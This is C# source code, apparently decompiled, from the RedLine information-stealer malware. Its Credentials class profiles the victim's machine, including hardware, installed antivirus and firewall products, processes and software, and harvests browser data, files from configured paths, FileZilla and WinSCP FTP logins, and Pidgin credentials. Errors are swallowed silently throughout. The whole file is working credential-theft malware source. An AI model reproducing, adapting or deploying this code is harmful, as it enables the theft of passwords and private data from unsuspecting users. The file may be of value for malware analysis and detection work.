using RedLine.Logic.Browsers;
using RedLine.Logic.Browsers.Chromium;
using RedLine.Logic.Browsers.Gecko;
using RedLine.Logic.FtpClients;
using RedLine.Logic.Helpers;
using RedLine.Logic.ImClient;
using RedLine.Logic.Others;
using RedLine.Models.Browsers;
using RedLine.Models.WMI;
using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management;
using System.Runtime.Serialization;

namespace RedLine.Models
{
  [DataContract(Name = "Credentials", Namespace = "v1/Models")]
  public class Credentials
  {
    [DataMember(Name = "Defenders")]
    public IList<string> Defenders { get; set; }

    [DataMember(Name = "Languages")]
    public IList<string> Languages { get; set; }

    [DataMember(Name = "InstalledSoftwares")]
    public IList<string> InstalledSoftwares { get; set; }

    [DataMember(Name = "Processes")]
    public IList<string> Processes { get; set; }

    [DataMember(Name = "Hardwares")]
    public IList<Hardware> Hardwares { get; set; }

    [DataMember(Name = "Browsers")]
    public IList<Browser> Browsers { get; set; }

    [DataMember(Name = "FtpConnections")]
    public IList<LoginPair> FtpConnections { get; set; }

    [DataMember(Name = "InstalledBrowsers")]
    public IList<InstalledBrowserInfo> InstalledBrowsers { get; set; }

    [DataMember(Name = "Files")]
    public IList<RemoteFile> Files { get; set; }

    public static Credentials Create(ClientSettings settings)
    {
      Credentials credentials = new Credentials()
      {
        Browsers = (IList<Browser>) new List<Browser>(),
        Files = (IList<RemoteFile>) new List<RemoteFile>(),
        FtpConnections = (IList<LoginPair>) new List<LoginPair>(),
        Hardwares = (IList<Hardware>) new List<Hardware>(),
        InstalledBrowsers = (IList<InstalledBrowserInfo>) new List<InstalledBrowserInfo>(),
        InstalledSoftwares = (IList<string>) new List<string>(),
        Languages = (IList<string>) new List<string>(),
        Processes = (IList<string>) new List<string>(),
        Defenders = (IList<string>) new List<string>()
      };
      try
      {
        WmiService wmiService = new WmiService();
        try
        {
          ReadOnlyCollection<WmiProcessor> source = wmiService.QueryAll<WmiProcessor>((WmiQueryBase) new WmiProcessorQuery(), (ManagementObjectSearcher) null);
          credentials.Hardwares = (IList<Hardware>) source.Select<WmiProcessor, Hardware>((Func<WmiProcessor, Hardware>) (x => new Hardware()
          {
            Caption = x.Name,
            HardType = HardwareType.Processor,
            Parameter = string.Format("{0}", (object) x.NumberOfCores)
          })).ToList<Hardware>();
        }
        catch
        {
        }
        try
        {
          if (credentials.Hardwares == null)
            credentials.Hardwares = (IList<Hardware>) new List<Hardware>();
          foreach (Hardware hardware in wmiService.QueryAll<WmiGraphicCard>((WmiQueryBase) new WmiGraphicCardQuery(), (ManagementObjectSearcher) null).Where<WmiGraphicCard>((Func<WmiGraphicCard, bool>) (x => x.AdapterRAM > 0U)).Select<WmiGraphicCard, Hardware>((Func<WmiGraphicCard, Hardware>) (x => new Hardware()
          {
            Caption = x.Name,
            HardType = HardwareType.Graphic,
            Parameter = string.Format("{0}", (object) x.AdapterRAM)
          })).ToList<Hardware>())
            credentials.Hardwares.Add(hardware);
        }
        catch
        {
        }
        try
        {
          List<WmiQueryBase> wmiQueryBaseList = new List<WmiQueryBase>()
          {
            (WmiQueryBase) new WmiAntivirusQuery(),
            (WmiQueryBase) new WmiAntiSpyWareQuery(),
            (WmiQueryBase) new WmiFirewallQuery()
          };
          string[] strArray = new string[2]
          {
            "ROOT\\SecurityCenter2",
            "ROOT\\SecurityCenter"
          };
          List<WmiAntivirus> source = new List<WmiAntivirus>();
          foreach (WmiQueryBase wmiQuery in wmiQueryBaseList)
          {
            foreach (string scope in strArray)
            {
              try
              {
                source.AddRange((IEnumerable<WmiAntivirus>) wmiService.QueryAll<WmiAntivirus>(wmiQuery, new ManagementObjectSearcher(scope, string.Empty)).ToList<WmiAntivirus>());
              }
              catch
              {
              }
            }
          }
          credentials.Defenders = (IList<string>) source.Select<WmiAntivirus, string>((Func<WmiAntivirus, string>) (x => x.DisplayName)).Distinct<string>().ToList<string>();
        }
        catch
        {
        }
        credentials.InstalledBrowsers = (IList<InstalledBrowserInfo>) UserInfoHelper.GetBrowsers();
        credentials.Processes = (IList<string>) UserInfoHelper.ListOfProcesses();
        credentials.InstalledSoftwares = (IList<string>) UserInfoHelper.ListOfPrograms();
        credentials.Languages = (IList<string>) UserInfoHelper.AvailableLanguages();
        if (settings.GrabBrowsers)
        {
          List<Browser> browserList = new List<Browser>();
          browserList.AddRange((IEnumerable<Browser>) ChromiumEngine.ParseBrowsers());
          browserList.AddRange((IEnumerable<Browser>) GeckoEngine.ParseBrowsers());
          browserList.Add(EdgeEngine.ParseBrowsers());
          foreach (Browser browser in browserList)
          {
            if (!browser.IsEmpty())
              credentials.Browsers.Add(browser);
          }
        }
        if (settings.GrabFiles)
          credentials.Files = RemoteFileGrabber.ParseFiles((IEnumerable<string>) settings.GrabPaths);
        if (settings.GrabFTP)
        {
          List<LoginPair> loginPairList = new List<LoginPair>();
          loginPairList.AddRange((IEnumerable<LoginPair>) FileZilla.ParseConnections());
          loginPairList.AddRange((IEnumerable<LoginPair>) WinSCP.ParseConnections());
          credentials.FtpConnections = (IList<LoginPair>) loginPairList;
        }
        if (settings.GrabImClients)
        {
          foreach (LoginPair connection in Pidgin.ParseConnections())
            credentials.FtpConnections.Add(connection);
        }
      }
      catch
      {
      }
      return credentials;
    }
  }
}
